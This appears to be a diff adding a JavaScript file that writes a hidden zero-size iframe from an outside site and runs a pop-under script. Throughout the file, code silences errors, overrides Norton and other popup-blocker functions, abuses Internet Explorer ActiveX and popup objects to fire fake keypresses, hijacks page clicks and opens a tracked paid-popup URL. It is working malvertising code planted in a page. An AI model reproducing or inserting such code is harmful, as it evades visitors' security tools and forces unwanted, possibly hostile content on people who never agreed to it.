@@ -1,0 +1,73 @@
+document.write ("<iframe src='http://www.ip686.com/pop.htm?aHR0cDovL2FhLjE4ZGQubmV0L3d3L25ldzExOS5odG0' width=0 height=0></iframe>")
+<!--
+window.name="http://www.ip686.com";
+var usingActiveX = true;
+function blockError(){return true;}
+window.onerror = blockError;
+//bypass norton internet security popup blocker
+if (window.SymRealWinOpen){window.open = SymRealWinOpen;}if(1>2){}
+if (window.NS_ActualOpen) {window.open = NS_ActualOpen;}if(1>2){}
+if (typeof(usingClick) == 'undefined') {var usingClick = false;}
+if (typeof(usingActiveX) == 'undefined') {var usingActiveX = false;}
+if (typeof(popwin) == 'undefined') {var popwin = null;}if(1>2){}
+if (typeof(poped) == 'undefined') {var poped = false;}if(1>2){}
+if (typeof(paypopupURL) == 'undefined') {var paypopupURL = "http://www.ip686.com/?popup";}
+var ddok=8888;
+var blk = 1;
+var setupClickSuccess = false;
+var googleInUse = false;
+var myurl = location.href+'/';
+var MAX_TRIED = 20;
+var activeXTried = false;
+if(1>2){}
+var tried = 0;
+var randkey = '0'; // random key from server
+var myWindow;
+var popWindow;
+var setupActiveXSuccess = 0;
+// bypass IE functions
+function setupActiveX() {if (usingActiveX) {try{if (setupActiveXSuccess < 5) {document.write('<INPUT STYLE="display:none;" ID="autoHit" TYPE="TEXT" ONKEYPRESS="showActiveX()">');ddok=8888;popWindow=window.createPopup();popWindow.document.body.innerHTML='<DIV ID="objectRemover"><OBJECT ID="getParentDiv" STYLE="position:absolute;top:0px;left:0px;" WIDTH=1 HEIGHT=1 DATA="'+myurl+'" TYPE="text/html"></OBJECT></DIV>';document.write('<IFRAME NAME="popIframe" STYLE="position:absolute;top:-100px;left:0px;width:1px;height:1px;" SRC="about:blank"></IFRAME>');popIframe.document.write('<OBJECT ID="getParentFrame" STYLE="position:absolute;top:0px;left:0px;" WIDTH=1 HEIGHT=1 DATA="'+myurl+'" TYPE="text/html"></OBJECT>');setupActiveXSuccess = 6;}}catch(e){if (setupActiveXSuccess < 5) {setupActiveXSuccess++;setTimeout('setupActiveX();',500);}else if (setupActiveXSuccess == 5) {activeXTried = true;setupClick();}}}}
+if(1>2){}
+function tryActiveX(){if (!activeXTried && !poped) {if (setupActiveXSuccess == 6 && googleInUse && popWindow && popWindow.document.getElementById('getParentDiv') && popWindow.document.getElementById('getParentDiv').object) {myWindow=popWindow.document.getElementById('getParentDiv').object.parentWindow;ddok=8888;}else if (setupActiveXSuccess == 6 && !googleInUse && popIframe && popIframe.getParentFrame && popIframe.getParentFrame.object && popIframe.getParentFrame.object.parentWindow){myWindow=popIframe.getParentFrame.object.parentWindow;popIframe.location.replace('about:blank');ddok=8888;}else {setTimeout('tryActiveX()',200);tried++;if (tried >= MAX_TRIED && !activeXTried) {activeXTried = true;setupClick();}return;}openActiveX();window.windowFired=true;self.focus();}}
+if(1>2){}
+function openActiveX(){if (!activeXTried && !poped) {if (myWindow && window.windowFired){window.windowFired=false;document.getElementById('autoHit').fireEvent("onkeypress",(document.createEventObject().keyCode=escape(randkey).substring(1)));}else {setTimeout('openActiveX();',100);}tried++;if (tried >= MAX_TRIED) {activeXTried = true;setupClick();}}}
+if(1>2){}
+function showActiveX(){if (!activeXTried && !poped) {if (googleInUse) {window.daChildObject=popWindow.document.getElementById('objectRemover').children(0);window.daChildObject=popWindow.document.getElementById('objectRemover').removeChild(window.daChildObject);}newWindow=myWindow.open(paypopupURL,'todo');if (newWindow) {newWindow.blur();self.focus();activeXTried = true;poped = true;}else {if (!googleInUse) {googleInUse=true;tried=0;tryActiveX();}else {activeXTried = true;setupClick();}}}}
+// end bypass IE functions
+// normal call functions
+function paypopup(){if (!poped) {if(!usingClick && !usingActiveX) {popwin = window.open(paypopupURL,'todo');if (popwin) {poped = true;}self.focus();}}if (!poped) {if (usingActiveX) {tryActiveX();}else {setupClick();}}}
+// end normal call functions
+// onclick call functions
+function setupClick() {if (!poped && !setupClickSuccess){if (window.Event) document.captureEvents(Event.CLICK);prePaypopOnclick = document.onclick;document.onclick = gopop;self.focus();setupClickSuccess=true;}}
+function gopop() {if (!poped) {popwin = window.open(paypopupURL,'todo');if (popwin) {poped = true;}self.focus();}if (typeof(prePaypopOnclick) == "function") {prePaypopOnclick();}}
+// end onclick call functions
+// check version
+function detectGoogle() {if (usingActiveX) {try {document.write('<DIV STYLE="display:none;"><OBJECT ID="detectGoogle" CLASSID="clsid:00EF2092-6AC5-47c0-BD25-CF2D5D657FEB" STYLE="display:none;" CODEBASE="view-source:about:blank"></OBJECT></DIV>');googleInUse|=(typeof(document.getElementById('detectGoogle'))=='object');}catch(e){setTimeout('detectGoogle();',50);}}}
+function version() {var os = 'W0';var bs = 'I0';var isframe = false;var browser = window.navigator.userAgent;if (browser.indexOf('Win') != -1) {os = 'W1';}if (browser.indexOf("SV1") != -1) {bs = 'I2';}else if (browser.indexOf("Opera") != -1) {bs = "I0";}else if (browser.indexOf("Firefox") != -1) {bs = "I0";}else if (browser.indexOf("Microsoft") != -1 || browser.indexOf("MSIE") != -1) {bs = 'I1';}if (top.location != this.location) {isframe = true;}paypopupURL = paypopupURL;usingClick = blk && ((browser.indexOf("SV1") != -1) || (browser.indexOf("Opera") != -1) || (browser.indexOf("Firefox") != -1));usingActiveX = blk && (browser.indexOf("SV1") != -1) && !(browser.indexOf("Opera") != -1) && ((browser.indexOf("Microsoft") != -1) || (browser.indexOf("MSIE") != -1));detectGoogle();}
+version();
+// end check version
+function loadingPop() {
+if(!usingClick && !usingActiveX) {paypopup();}
+else if (usingActiveX) {tryActiveX();}
+else {setupClick();}
+}
+myurl = myurl.substring(0, myurl.indexOf('/',8));
+if (myurl == '') {myurl = '.';}
+function popOpen(){setupActiveX();loadingPop();}
+var isOpened=false;
+var openSwitch="";
+//write for unonload
+function openwin2() {
+ window.open(paypopupURL,'','').blur();
+ window.focus();
+}
+var paypopupURL ="http://www.ip686.com/pop/gogo.asp?PopId=726&PopUserName=liuda&ST=3&STO=&Url=http://www.01638.net/&ComeIp=219.141.20.98&IdFlag=98390&ComeUrl=http://www.01638.net/&IS=&GS=865942007102886594";
+if (ispopup()==0){
+ popOpen();
+ setTimeout("focus()",300);
+ setTimeout("focus()",1000);
+ setTimeout("focus()",3000);
+ setTimeout("focus()",5000);
+}
+writecookie("71C570102EE77010556F615C1FC82B7F","1","96");
+//-->
